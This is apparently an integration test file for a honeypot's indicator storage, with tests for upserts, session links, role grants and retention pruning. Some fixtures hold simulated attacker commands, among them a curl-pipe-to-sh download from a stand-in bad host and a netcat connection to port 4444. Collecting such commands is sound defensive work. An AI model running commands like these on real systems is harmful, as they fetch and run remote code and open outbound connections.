"""Indicator storage against a real TimescaleDB: upsert, links, grants, retention."""

import os
from pathlib import Path
from typing import Any

import pytest
from sqlalchemy import text
from sqlalchemy.exc import DBAPIError
from sqlalchemy.ext.asyncio import AsyncEngine, AsyncSession, async_sessionmaker

from ingest.enrichment import GeoResolver
from ingest.enrichment.enricher import Enricher
from ingest.indicators import IndicatorExtractor, IndicatorSettings
from ingest.tagging import load_rules
from ingest.writer import write_batch

from .db_fixtures import ROLE_ENV, _role_url
from .helpers import make_event

pytestmark = [
    pytest.mark.integration,
    pytest.mark.skipif(not os.environ.get("POSTGRES_HOST"), reason="POSTGRES_HOST not set"),
]

RULES = load_rules(Path(__file__).resolve().parents[1] / "rules")


def addr(*octets: int) -> str:
    return ".".join(str(o) for o in octets)


def enricher(tmp_path: Path, cap: int = 500) -> Enricher:
    return Enricher(
        GeoResolver(tmp_path, fake_for_private=True),
        RULES,
        indicators=IndicatorExtractor(IndicatorSettings()),
        link_cap=cap,
    )


async def rows(engine: AsyncEngine, sql: str, **params: Any) -> list[Any]:
    async with engine.connect() as conn:
        return list((await conn.execute(text(sql), params)).all())


def dl(sid: str, ip: str, url: str, off: float = 1) -> Any:
    return make_event("download_attempt", sid=sid, ip=ip, offset_s=off, data={"url": url})


async def test_indicators_are_stored_counted_and_linked(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
) -> None:
    enr = enricher(tmp_path)
    await write_batch(
        factory,
        [
            dl("a", "203.0.113.1", "http://dl.badhost.ru/x.sh"),
            make_event(
                "command",
                sid="a",
                ip="203.0.113.1",
                offset_s=2,
                data={"input": "curl http://dl.badhost.ru/x.sh | sh; nc 8.8.4.4 4444"},
            ),
            dl("b", "203.0.113.2", "http://dl.badhost.ru/x.sh"),
        ],
        enr,
    )
    items = {
        (r.type, r.value): r
        for r in await rows(engine, "SELECT type, value, role, sightings, sensors FROM indicators")
    }
    assert items[("url", "http://dl.badhost.ru/x.sh")].sightings == 3
    assert items[("domain", "dl.badhost.ru")].role == "download_host"
    assert items[("ip", "8.8.4.4")].role == "contacted_host"
    links = await rows(
        engine,
        "SELECT i.value, s.session_id, host(s.src_ip) AS ip FROM indicator_sessions s "
        "JOIN indicators i ON i.id = s.indicator_id WHERE i.type = 'domain'",
    )
    assert sorted((r.session_id, r.ip) for r in links) == [
        ("a", "203.0.113.1"),
        ("b", "203.0.113.2"),
    ]

    # A later batch: counters add up, links do not duplicate, the sensor list grows.
    await write_batch(
        factory,
        [make_event("download_attempt", sid="c", ip="203.0.113.3", sensor="telnet",
                    data={"url": "http://dl.badhost.ru/x.sh"}),
         dl("a", "203.0.113.1", "http://dl.badhost.ru/x.sh", off=9)],
        enr,
    )  # fmt: skip
    (dom,) = await rows(
        engine, "SELECT sightings, sensors FROM indicators WHERE value = 'dl.badhost.ru'"
    )
    assert dom.sightings == 5 and dom.sensors == ["ssh", "telnet"]
    (n,) = await rows(
        engine, "SELECT count(*) AS n FROM indicator_sessions s JOIN indicators i "
        "ON i.id = s.indicator_id WHERE i.value = 'dl.badhost.ru'"
    )  # fmt: skip
    assert n.n == 3


async def test_contacted_host_is_promoted_to_download_host(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
) -> None:
    enr = enricher(tmp_path)
    cmd = make_event("command", sid="a", data={"input": "ping evil.badhost.ru"})
    await write_batch(factory, [cmd], enr)
    (r,) = await rows(engine, "SELECT role FROM indicators WHERE value = 'evil.badhost.ru'")
    assert r.role == "contacted_host"
    await write_batch(factory, [dl("a", "203.0.113.7", "http://evil.badhost.ru/a", 5)], enr)
    (r,) = await rows(engine, "SELECT role FROM indicators WHERE value = 'evil.badhost.ru'")
    assert r.role == "download_host"
    await write_batch(factory, [cmd], enr)  # a later plain sighting never demotes it
    (r,) = await rows(engine, "SELECT role FROM indicators WHERE value = 'evil.badhost.ru'")
    assert r.role == "download_host"


async def test_links_are_capped_per_indicator(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
) -> None:
    enr = enricher(tmp_path, cap=3)
    for batch in range(2):
        await write_batch(
            factory,
            [
                dl(f"s{batch}-{i}", f"203.0.113.{i + 1}", "http://busy.badhost.ru/a")
                for i in range(4)
            ],
            enr,
        )
    (host,) = await rows(
        engine, "SELECT sightings, id FROM indicators WHERE value = 'busy.badhost.ru'"
    )
    assert host.sightings == 8  # the counter is exact
    (n,) = await rows(
        engine, "SELECT count(*) AS n FROM indicator_sessions WHERE indicator_id = :i", i=host.id
    )
    assert n.n == 3


async def test_private_and_documentation_values_never_reach_the_database(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
) -> None:
    await write_batch(
        factory,
        [
            dl("a", "203.0.113.1", f"http://{addr(10, 0, 0, 5)}/a"),
            dl("a", "203.0.113.1", "http://203.0.113.9/a"),
            dl("a", "203.0.113.1", "http://example.com/a"),
            make_event("command", sid="a", data={"input": "wget http://root:pw@127.0.0.1/x"}),
        ],
        enricher(tmp_path),
    )
    assert await rows(engine, "SELECT 1 FROM indicators") == []


async def test_event_write_survives_an_indicator_failure(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
) -> None:
    async with engine.begin() as conn:
        await conn.execute(text("ALTER TABLE indicator_sessions RENAME TO indicator_sessions_x"))
    try:
        await write_batch(
            factory, [dl("a", "203.0.113.1", "http://dl.badhost.ru/x")], enricher(tmp_path)
        )
    finally:
        async with engine.begin() as conn:
            await conn.execute(
                text("ALTER TABLE indicator_sessions_x RENAME TO indicator_sessions")
            )
    assert len(await rows(engine, "SELECT 1 FROM events")) == 1
    assert len(await rows(engine, "SELECT 1 FROM sessions")) == 1
    assert await rows(engine, "SELECT 1 FROM indicators") == []  # rolled back with its savepoint


async def test_grants(engine: AsyncEngine) -> None:
    async def priv(role: str, table: str, p: str) -> bool:
        async with engine.connect() as conn:
            return bool(
                await conn.scalar(
                    text("SELECT has_table_privilege(:r, :t, :p)"), {"r": role, "t": table, "p": p}
                )
            )

    ing, api = ROLE_ENV["POSTGRES_INGEST_USER"], ROLE_ENV["POSTGRES_API_USER"]
    for table in ("indicators", "indicator_sessions", "indicator_intel"):
        assert all([await priv(ing, table, p) for p in ("SELECT", "INSERT", "UPDATE")])
        assert not any([await priv(ing, table, p) for p in ("DELETE", "TRUNCATE")])
        assert await priv(api, table, "SELECT")
        assert not any([await priv(api, table, p) for p in ("INSERT", "UPDATE", "DELETE")])


async def test_prune_job_deletes_expired_indicators_with_their_links(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
) -> None:
    async with engine.begin() as conn:
        await conn.execute(
            text(
                "INSERT INTO indicators (type, value, role, first_seen, last_seen) VALUES "
                "('domain', 'old.badhost.ru', 'contacted_host', now() - interval '200 days', "
                "now() - interval '100 days'), "
                "('domain', 'new.badhost.ru', 'contacted_host', now(), now())"
            )
        )
        await conn.execute(
            text(
                "INSERT INTO indicator_sessions SELECT id, 's', '203.0.113.1', 'ssh', last_seen "
                "FROM indicators"
            )
        )
        await conn.execute(
            text(
                "INSERT INTO indicator_intel (indicator_id, source, known) "
                "SELECT id, 'urlhaus', true FROM indicators"
            )
        )
    async with engine.connect() as conn:
        job = await conn.scalar(
            text(
                "SELECT config ->> 'retention_days' FROM timescaledb_information.jobs "
                "WHERE proc_name = 'suckerpot_indicator_prune'"
            )
        )
        assert job == "90"
    async with engine.begin() as conn:
        await conn.execute(text("CALL suckerpot_indicator_prune(0, '{\"retention_days\": 90}')"))
    assert [r.value for r in await rows(engine, "SELECT value FROM indicators")] == [
        "new.badhost.ru"
    ]
    assert len(await rows(engine, "SELECT 1 FROM indicator_sessions")) == 1
    assert len(await rows(engine, "SELECT 1 FROM indicator_intel")) == 1


async def test_api_and_ingest_roles_are_connectable(engine: AsyncEngine) -> None:
    """Sanity: the role URLs used above work and the API role cannot write indicators."""
    from suckerpot_db import create_engine

    eng = create_engine(_role_url("API"), pool_size=1)
    try:
        async with eng.connect() as conn:
            await conn.execute(text("SELECT count(*) FROM indicators"))
        with pytest.raises(DBAPIError):
            async with eng.begin() as conn:
                await conn.execute(
                    text(
                        "INSERT INTO indicators (type, value, role, first_seen, last_seen) "
                        "VALUES ('domain', 'x.badhost.ru', 'contacted_host', now(), now())"
                    )
                )
    finally:
        await eng.dispose()
